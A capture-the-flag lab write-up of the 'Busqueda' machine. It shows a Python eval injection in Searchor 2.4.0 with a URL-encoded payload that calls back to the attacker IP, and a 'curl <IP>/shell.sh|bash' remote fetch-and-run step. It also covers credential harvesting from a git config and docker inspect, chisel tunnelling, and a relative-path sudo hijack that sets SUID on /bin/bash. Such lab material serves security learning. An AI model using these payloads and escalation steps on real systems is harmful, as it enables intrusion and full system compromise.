# Busqueda

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.51.139        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:25 EDT
Warning: 10.129.51.139 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.51.139
Host is up (0.17s latency).
Not shown: 65515 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

We would have to add `searcher.htb` to our `/etc/hosts` file to view the website.

### Searcher

This website seems to be a type of search engine using Flask:

<figure><img src="../../.gitbook/assets/image (3211).png" alt=""><figcaption></figcaption></figure>

We can submit queries at the bottom using a custom machine and stuff:

<figure><img src="../../.gitbook/assets/image (3832).png" alt=""><figcaption></figcaption></figure>

Whatever query we do here, depending on the engine, it would generate a URL for us with a `query` parameter appended at the end:

<figure><img src="../../.gitbook/assets/image (2869).png" alt=""><figcaption></figcaption></figure>

It seems that the website rejects any engine that is not present on its list. Running `gobuster` does not seem to reveal anything of interest, so let's take a closer look at the website itself. At the very bottom, it seems there's a link to the software being used, which is Searchor 2.4.0:

<figure><img src="../../.gitbook/assets/image (1744).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/ArjunSharda/Searchor" %}

Looks like we need to do some source code review on this library.&#x20;

### Github Source Code

The repository seems to be on v2.5.0, while the website is running v2.4.0. As such, we probably need to dive into the logs of this website to find out what was changed from v2.4.0. Looking at the commit history, we see that there's a `remove eval from search cli method` commit made:

<figure><img src="../../.gitbook/assets/image (1856).png" alt=""><figcaption></figcaption></figure>

Here are the changes made:

<figure><img src="../../.gitbook/assets/image (3024).png" alt=""><figcaption></figcaption></figure>

This is vulnerbale because it uses `eval` to run the queries. Checking the v ersion, this edit was made for v2.4.2f, which means the machine is running a vulnerable version that is outdated since changes were not made for v2.4.0, specifically in the `query` parameter.&#x20;

I sent `import('os').system('ping -c 1 10.10.16.41')` as the query, and got a response on `tcpdump`:

<figure><img src="../../.gitbook/assets/image (2335).png" alt=""><figcaption></figcaption></figure>

Now, we just need to gain a reverse shell. It seems that `eval` as it cannot process the reverse shells I put in. I found this writeup for a bug bounty that bypasses this by using `compile()`.&#x20;

{% embed url="https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html" %}

However, this exploit would require us to 'close' the previous `eval` function and use another one. As such, we have to prepend our payload with `d'` to close the previous query. Using this payload, we can confirm RCE via `curl`:

```
d'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.16.41/test")','a','single'))%2b'
```

<figure><img src="../../.gitbook/assets/image (2599).png" alt=""><figcaption></figcaption></figure>

All we have to do is change the command to `curl <IP>/shell.sh|bash`.

<figure><img src="../../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>

With this, we can grab the user flag.

## Privilege Escalation

First I upgraded the shell by dropping my SSH public key into the machine. Then we can continue with our enumeration.

### Sudo Credentials

I initially ran a LinPEAS and `pspy64` scan, but found nothing from there. Next thing is to look for credentials, and we can start with `/var/www/app` since that's where the application source code is.

```
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 Apr 10 14:41 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
```

There was a git repo there, and I tried to view the logs but found nothing. Instead, within the directory there were some credentials:

```
svc@busqueda:/var/www/app/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

We can attempt a password reuse on the `svc` user to check the `sudo` privileges:

```
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Cool. We can't read the file, but we can see the options we have:

```
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Running the `docker-ps` option, we can see the other containers within the machine:

```
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Based on docker documentation, we would have to specify a format that we want to inspect. I `{{.Config}}` for this and got a few passwords out:

{% code overflow="wrap" %}
```
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} 960873171e2e
{960873171e2e   false false false map[22/tcp:{} 3000/tcp:{}] false false false [USER_UID=115 USER_GID=121 GITEA__database__DB_TYPE=mysql GITEA__database__HOST=db:3306 GITEA__database__NAME=gitea GITEA__database__USER=gitea GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea] [/bin/s6-svscan /etc/s6] <nil> false gitea/gitea:latest map[/data:{} /etc/localtime:{} /etc/timezone:{}]  [/usr/bin/entrypoint] false  [] map[com.docker.compose.config-hash:e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515 com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:server com.docker.compose.version:1.29.2 maintainer:maintainers@gitea.io org.opencontainers.image.created:2022-11-24T13:22:00Z org.opencontainers.image.revision:9bccc60cf51f3b4070f5506b042a3d9a1442c73d org.opencontainers.image.source:https://github.com/go-gitea/gitea.git org.opencontainers.image.url:https://github.com/go-gitea/gitea]  <nil> []}
```
{% endcode %}

With this, we can try to access the Gitea instance at port 3000 via port forwarding.

### Gitea -> Root shell

We can port foward via `chisel`.

```bash
# on Busqueda
./chisel client 10.10.16.41:1080 R:3000:127.0.0.1:3000
# on kali
chisel server -p 1080 --reverse
```

Then we can access http://localhost:3000 to view Gitea:

<figure><img src="../../.gitbook/assets/image (1195).png" alt=""><figcaption></figcaption></figure>

Using the same MySQL password of `yuiu1hoiu4i5ho1uh`, we can login as `administrator`. We can see some repos:

<figure><img src="../../.gitbook/assets/image (1593).png" alt=""><figcaption></figcaption></figure>

And within administrator / scripts repo, we can read the system checkup script:

```python
#!/bin/bash
import subprocess
import sys
actions = ['full-checkup', 'docker-ps','docker-inspect']
def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()
    return output
def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list))  
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
        except Exception as e:
            print('Something went wrong')
            exit(1) 
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
if __name__ == '__main__':
    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError
    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

The `full-checkup` seems to run a script, **but it does not specify the absolute path of the script.** As such, we can create a fake copy of this script and execute `chmod u+s /bin/bash`.

We just need to create the malicious script named `full-checkup.sh` and make it executable.

```bash
#!/bin/bash
chmod u+s /bin/bash
```

Afterwards, we can run the script with `sudo` and see that `/bin/bash` is now an SUID.

```
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@busqueda:~$ /bin/bash -p
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
bash-5.1# cat /root/root.txt
<REDACTED>
```

Pwned!
